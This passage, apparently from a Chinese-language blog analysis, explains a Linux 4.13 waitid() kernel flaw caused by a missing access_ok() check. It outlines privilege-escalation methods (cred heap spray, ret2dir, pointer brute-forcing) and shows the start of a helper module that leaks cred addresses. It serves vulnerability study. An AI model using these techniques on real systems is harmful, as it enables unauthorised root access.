Efault);</span><br><span class="line">	unsafe_put_user(info.status, &amp;infop-&gt;si_status, Efault);</span><br><span class="line">	user_access_end();     <span class="comment">// 开启SMAP，禁止内核访问用户进程内存空间</span></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">Efault:</span><br><span class="line">	user_access_end();</span><br><span class="line">	<span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="user-access-begin"><a href="#user-access-begin" class="headerlink" title="user_access_begin"></a>user_access_begin</h3><p>该函数关闭了SAMP，允许内核访问用户进程内存空间，其函数内容为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> user_access_begin()	__uaccess_begin()</span></span><br></pre></td></tr></table></figure>
+
+<p>实际上调用了<code>__uaccess_begin()</code>，再看看<code>__uaccess_begin()</code>；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __uaccess_begin() stac()</span></span><br></pre></td></tr></table></figure>
+
+<p>实际上调用了<code>stac()</code>；</p>
+<h4 id="stac"><a href="#stac" class="headerlink" title="stac"></a>stac</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &quot;Raw&quot; instruction opcodes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ASM_STAC	.byte 0x0f,0x01,0xcb</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_FEATURE_SMAP	( 9*32+20) <span class="comment">/* Supervisor Mode Access Prevention */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">stac</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Note: a barrier is implicit in alternative() */</span></span><br><span class="line">	alternative(<span class="string">&quot;&quot;</span>, __stringify(__ASM_STAC), X86_FEATURE_SMAP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里一直跟踪<code>alternative()</code>函数的执行流，最终到了下面这个代码；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ALTERNATIVE_CFG(oldinstr, newinstr, feature, cfg_enabled)	\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.if &quot;</span>__stringify(cfg_enabled)<span class="meta-string">&quot; == 1\n&quot;</span>				\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;661:\n\t&quot;</span>							\</span></span><br><span class="line"><span class="meta">	oldinstr <span class="meta-string">&quot;\n&quot;</span>							\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;662:\n&quot;</span>							\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.pushsection .altinstructions,\&quot;a\&quot;\n&quot;</span>				\</span></span><br><span class="line"><span class="meta">	ALTINSTR_ENTRY(feature)						\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.popsection\n&quot;</span>							\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.pushsection .altinstr_replacement, \&quot;a\&quot;\n&quot;</span>			\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;663:\n\t&quot;</span>							\</span></span><br><span class="line"><span class="meta">	newinstr <span class="meta-string">&quot;\n&quot;</span>							\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;664:\n\t&quot;</span>							\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.popsection\n\t&quot;</span>						\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.org	. - (664b-663b) + (662b-661b)\n\t&quot;</span>			\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.org	. - (662b-661b) + (664b-663b)\n&quot;</span>			\</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;.endif\n&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><code>stac()</code>函数设置了<code>Extended Features CPUID leaf</code>，也就是<code>EFLAGS</code>的<code>AC</code>位，暂时关闭了<code>SMAP</code>；</p>
+<h3 id="unsafe-put-user"><a href="#unsafe-put-user" class="headerlink" title="unsafe_put_user"></a>unsafe_put_user</h3><p>在该漏洞版本中，缺少了<code>access_ok()</code>对指针的检查，在暂时关闭了<code>SMAP</code>后直接对用户内存空间进行操作；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/asm/uaccess.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The &quot;unsafe&quot; user accesses aren&#x27;t really &quot;unsafe&quot;, but the naming</span></span><br><span class="line"><span class="comment"> * is a big fat warning: you have to not only do the access_ok()</span></span><br><span class="line"><span class="comment"> * checking before using them, but you have to surround them with the</span></span><br><span class="line"><span class="comment"> * user_access_begin/end() pair.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsafe_put_user(x, ptr, err_label)					\</span></span><br><span class="line"><span class="meta">do &#123;										\</span></span><br><span class="line"><span class="meta">	int __pu_err;								\</span></span><br><span class="line"><span class="meta">	__typeof__(*(ptr)) __pu_val = (x);					\</span></span><br><span class="line"><span class="meta">	__put_user_size(__pu_val, (ptr), sizeof(*(ptr)), __pu_err, -EFAULT);	\</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> (unlikely(__pu_err)) goto err_label;					\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>
+
+<p>官方提示了在使用<code>unsafe_put_user</code>的时候，需要配合使用<code>user_access_begin/end()</code>；</p>
+<p>并且需要调用<code>access_ok()</code>来检查指针，但是这里缺失了<code>access_ok()</code>的检查；</p>
+<h3 id="access-ok"><a href="#access-ok" class="headerlink" title="access_ok"></a>access_ok</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * access_ok: - Checks if a user space pointer is valid</span></span><br><span class="line"><span class="comment"> * @type: Type of access: %VERIFY_READ or %VERIFY_WRITE.  Note that</span></span><br><span class="line"><span class="comment"> *        %VERIFY_WRITE is a superset of %VERIFY_READ - if it is safe</span></span><br><span class="line"><span class="comment"> *        to write to a block, it is always safe to read from it.</span></span><br><span class="line"><span class="comment"> * @addr: User space pointer to start of block to check</span></span><br><span class="line"><span class="comment"> * @size: Size of block to check</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Context: User context only. This function may sleep if pagefaults are</span></span><br><span class="line"><span class="comment"> *          enabled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Checks if a pointer to a block of memory in user space is valid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns true (nonzero) if the memory block may be valid, false (zero)</span></span><br><span class="line"><span class="comment"> * if it is definitely invalid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that, depending on architecture, this function probably just</span></span><br><span class="line"><span class="comment"> * checks that the pointer is in the user space range - after calling</span></span><br><span class="line"><span class="comment"> * this function, memory access functions may still return -EFAULT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> access_ok(type, addr, size)                    \</span></span><br><span class="line"><span class="meta">(&#123;                                    \</span></span><br><span class="line"><span class="meta">    WARN_ON_IN_IRQ();                        \</span></span><br><span class="line"><span class="meta">    likely(!__range_not_ok(addr, size, user_addr_max()));        \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里实际上检查了指针所处的内存地址范围是否合法；</p>
+<h4 id="user-addr-max"><a href="#user-addr-max" class="headerlink" title="user_addr_max"></a>user_addr_max</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/asm/uaccess.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> user_addr_max() (current-&gt;thread.addr_limit.seg)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>user_addr_max()</code> 为 <code>current-&gt;thread.addr_limit.seg</code> ，是用户态地址的边界；</p>
+<h4 id="range-not-ok"><a href="#range-not-ok" class="headerlink" title="__range_not_ok"></a>__range_not_ok</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/asm/uaccess.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __range_not_ok(addr, size, limit)				\</span></span><br><span class="line"><span class="meta">(&#123;									\</span></span><br><span class="line"><span class="meta">	__chk_user_ptr(addr);						\</span></span><br><span class="line"><span class="meta">	__chk_range_not_ok((unsigned long __force)(addr), size, limit); \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
+
+<p>于是调用<code>__range_not_ok()</code>来检查地址有无越界；</p>
+<h5 id="chk-user-ptr"><a href="#chk-user-ptr" class="headerlink" title="__chk_user_ptr"></a>__chk_user_ptr</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tools/virtio/linux/uaccess.h</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __chk_user_ptr(<span class="keyword">const</span> <span class="keyword">volatile</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">	assert(p &gt;= __user_addr_min &amp;&amp; p + size &lt;= __user_addr_max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>__chk_user_ptr()</code>由于检查<code>addr</code>参数指针是否指向用户态；</p>
+<h5 id="chk-range-not-ok"><a href="#chk-range-not-ok" class="headerlink" title="__chk_range_not_ok"></a>__chk_range_not_ok</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/asm/uaccess.h</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> __chk_range_not_ok(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> limit)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we have used &quot;sizeof()&quot; for the size,</span></span><br><span class="line"><span class="comment">	 * we know it won&#x27;t overflow the limit (but</span></span><br><span class="line"><span class="comment">	 * it might overflow the &#x27;addr&#x27;, so it&#x27;s</span></span><br><span class="line"><span class="comment">	 * important to subtract the size from the</span></span><br><span class="line"><span class="comment">	 * limit, not add it to the address).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size))</span><br><span class="line">		<span class="keyword">return</span> unlikely(addr &gt; limit - size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Arbitrary sizes? Be careful about overflow */</span></span><br><span class="line">	addr += size;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(addr &lt; size))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> unlikely(addr &gt; limit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>__chk_range_not_ok()</code>用于检查加上偏移（size）后的<code>addr</code>是否越界，即<code>addr+size</code>是否仍然指向用户态；</p>
+<h4 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h4><p>这里举一个例子，<code>access_ok()</code>对地址进行检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">__setup_frame(<span class="keyword">int</span> sig, struct ksignal *ksig, <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, struct pt_regs *regs)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> __<span class="title">user</span> *<span class="title">frame</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user *restorer;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span> __user *fpstate = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    frame = get_sigframe(&amp;ksig-&gt;ka, regs, <span class="keyword">sizeof</span>(*frame), &amp;fpstate);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, frame, <span class="keyword">sizeof</span>(*frame)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里检查<code>frame</code>的地址是否是用户态的。</p>
+<p><code>setup_frame</code> 信号处理的步骤为：</p>
+<ol>
+<li>返回到用户态执行信号处理程序，CPU要从内核栈中找到返回到用户态的地址（就是调用系统调用的下一条代码指令地址）Linux为了先让信号处理程序执行，所以就需要把这个返回地址修改为信号处理程序的入口，这样当从系统调用返回到用户态时，就可以执行信号处理程序了。；</li>
+<li>执行完信号处理程序后再返回到内核态，用户态的<code>signal handler</code>执行完毕后，重新切回内核态。（通过<code>sigreturn()</code> 系统调用，在 <code>sigreturn()</code> 中恢复原来内核栈的内容，SROP是由于 <code>sigreturn</code>后没有对数据做检查就弹到寄存器，导致恶意的gadgets得以执行；</li>
+<li>在内核态完成收尾工作。</li>
+</ol>
+<h3 id="user-access-end"><a href="#user-access-end" class="headerlink" title="user_access_end"></a>user_access_end</h3><p>调用了<code>clac()</code>函数；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> user_access_end()	__uaccess_end()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __uaccess_end() clac()</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="clac"><a href="#clac" class="headerlink" title="clac"></a>clac</h4><p>与<code>stac()</code>同理；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ASM_CLAC	.byte 0x0f,0x01,0xca</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_FEATURE_SMAP	( 9*32+20) <span class="comment">/* Supervisor Mode Access Prevention */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">clac</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Note: a barrier is implicit in alternative() */</span></span><br><span class="line">	alternative(<span class="string">&quot;&quot;</span>, __stringify(__ASM_CLAC), X86_FEATURE_SMAP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>clac()</code>开启了<code>SMAP</code></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>一些系统调用的函数会调用<code>put_user</code>和<code>get_user</code>来进行内核与用户之间的数据传输，为了避免重复检查<code>SMAP</code>的开启或者关闭状态带来的额外开销，内核开发人员引用了不安全的<code>_put_user</code>和<code>unsafe_put_user</code>函数，它们缺少了必要的安全检查；</p>
+<p>在内核版本4.13中，为了能够正常使用<code>unsafe_put_user</code>，专门对<code>waitid syscall</code>进行了更新，但仍然少了<code>access_ok</code>的检查；</p>
+<p>漏洞代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/exit.c</span></span><br><span class="line">SYSCALL_DEFINE5(waitid, <span class="keyword">int</span>, which, <span class="keyword">pid_t</span>, upid, struct siginfo __user *,</span><br><span class="line">		infop, <span class="keyword">int</span>, options, struct rusage __user *, ru)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rusage</span> <span class="title">r</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">waitid_info</span> <span class="title">info</span> =</span> &#123;.status = <span class="number">0</span>&#125;;   <span class="comment">// </span></span><br><span class="line">	<span class="keyword">long</span> err = kernel_waitid(which, upid, &amp;info, options, ru ? &amp;r : <span class="literal">NULL</span>);  <span class="comment">// 调用waitid</span></span><br><span class="line">	<span class="keyword">int</span> signo = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (err &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		signo = SIGCHLD;     <span class="comment">// 信号处理号为SIGCHLD</span></span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!err) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ru &amp;&amp; copy_to_user(ru, &amp;r, <span class="keyword">sizeof</span>(struct rusage))) <span class="comment">// </span></span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!infop)       <span class="comment">// 信号指针异常</span></span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	user_access_begin();   <span class="comment">// 关闭SAMP，允许内核访问用户进程内存空间</span></span><br><span class="line">	unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);</span><br><span class="line">	unsafe_put_user(<span class="number">0</span>, &amp;infop-&gt;si_errno, Efault);</span><br><span class="line">	unsafe_put_user((<span class="keyword">short</span>)info.cause, &amp;infop-&gt;si_code, Efault);</span><br><span class="line">	unsafe_put_user(info.pid, &amp;infop-&gt;si_pid, Efault);</span><br><span class="line">	unsafe_put_user(info.uid, &amp;infop-&gt;si_uid, Efault);</span><br><span class="line">	unsafe_put_user(info.status, &amp;infop-&gt;si_status, Efault);</span><br><span class="line">	user_access_end();     <span class="comment">// 开启SMAP，禁止内核访问用户进程内存空间</span></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">Efault:</span><br><span class="line">	user_access_end();</span><br><span class="line">	<span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以根据上述知识储备的内容，可以知道，如果没有使用<code>access_ok</code>进行检查的话，<code>unsafe_put_user</code>会直接对<code>ptr</code>所指的地址进行写入数据的操作，如下面对<code>ptr</code>写入了<code>x</code>；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsafe_put_user(x, ptr, err_label)					\</span></span><br><span class="line"><span class="meta">do &#123;										\</span></span><br><span class="line"><span class="meta">	int __pu_err;								\</span></span><br><span class="line"><span class="meta">	__typeof__(*(ptr)) __pu_val = (x);					\</span></span><br><span class="line"><span class="meta">	__put_user_size(__pu_val, (ptr), sizeof(*(ptr)), __pu_err, -EFAULT);	\</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> (unlikely(__pu_err)) goto err_label;					\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>
+
+<p>而针对<code>waitid</code>系统调用的源码而言，<code>unsafe_put_user(0, &amp;infop-&gt;si_errno, Efault)</code>（第二个<code>unsafe_put_user()</code>）向一个可控制的地址写了一个空字节<code>\0</code>，想到，如果往<code>cred</code>结构体里的<code>uid</code>参数写入的话，就可以实现提权了，关键在于如何找到进程空间中的<code>cred</code>结构体的位置；</p>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>普通用户通过调用<code>waitid()</code>时，使用<code>infop</code>指针指向内核地址（这是因为<code>infop</code>指针是一个<code>struct siginfo _user*</code>的结构），此时内核会将内容<code>x</code>写入该地址。</p>
+<p>几种可用的攻击方式：</p>
+<ul>
+<li>堆喷射（heap spray）：<code>fork()</code>大量的进程，由于每个进程都会对应一个<code>cred</code>结构体，任意写某一个进程<code>cred</code>的<code>uid</code>，之后使用<code>getuid()</code>来检测是否有进程的<code>cred.uid</code>为<code>0</code>；</li>
+<li>ret2dir：首先找到用户区域和内核区域对应的<code>physmap</code>的地址，往其中写入payload，通过找到内核对应的<code>physmap</code>的虚拟地址，最后吧内核态的执行流拉倒内核对应的<code>physmap</code>地址上；</li>
+<li>爆破：通过爆破<code>struct file</code>的地址，找到<code>file</code>结构体中指向当前的<code>cred</code>结构体的指针，接下来就可以直接任意写</li>
+</ul>
+<p>当前的<code>cred</code>结构体；</p>
+<ul>
+<li>利用覆写<code>have_canfork_calback</code>触发空指针引用<code>fork()</code>提权；</li>
+</ul>
+<h3 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h3><p>这里选择使用<code>heap spray</code>提权；</p>
+<p>条件：</p>
+<ul>
+<li>通过<code>unsafe_put_user</code>将<code>0</code>写入内核任意位置；</li>
+<li>如果知道<code>cred</code>结构体地址，则可以改写<code>uid</code>和<code>euid</code>；</li>
+<li><code>waitpid</code>在非法发昂文内存的时候会返回错误代码，而不会崩溃（-EFAULT）；</li>
+</ul>
+<p>方法：</p>
+<ul>
+<li><p><code>clone()</code>多个进程，使得<code>cred</code>结构体数目增多；</p>
+</li>
+<li><p>通过<code>insmod</code>一个驱动，观察每个<code>cred</code>结构体中的<code>euid</code>的位置；<br>例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// my_module.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span>        <span class="comment">// for basic filesystem</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span>    <span class="comment">// for the proc filesystem</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seq_file.h&gt;</span>    <span class="comment">// for sequence files</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span>* <span class="title">my_file</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">my_show</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">my_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     printk(<span class="string">&quot;EUID: %p\n&quot;</span>, &amp;current-&gt;cred-&gt;euid);</span><br><span class="line">     <span class="keyword">return</span> single_open(file, my_show, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_fops</span> =</span> &#123;</span><br><span class="line">    .owner    = THIS_MODULE,</span><br><span class="line">    .open    = my_open,</span><br><span class="line">    .read    = seq_read,</span><br><span class="line">    .llseek    = seq_lseek,</span><br><span class="line">    .release    = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init</span></span><br><span class="line"><span class="function"><span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    my_file = proc_create(<span class="string">&quot;jif&quot;</span>, <span class="number">0</span>, <span 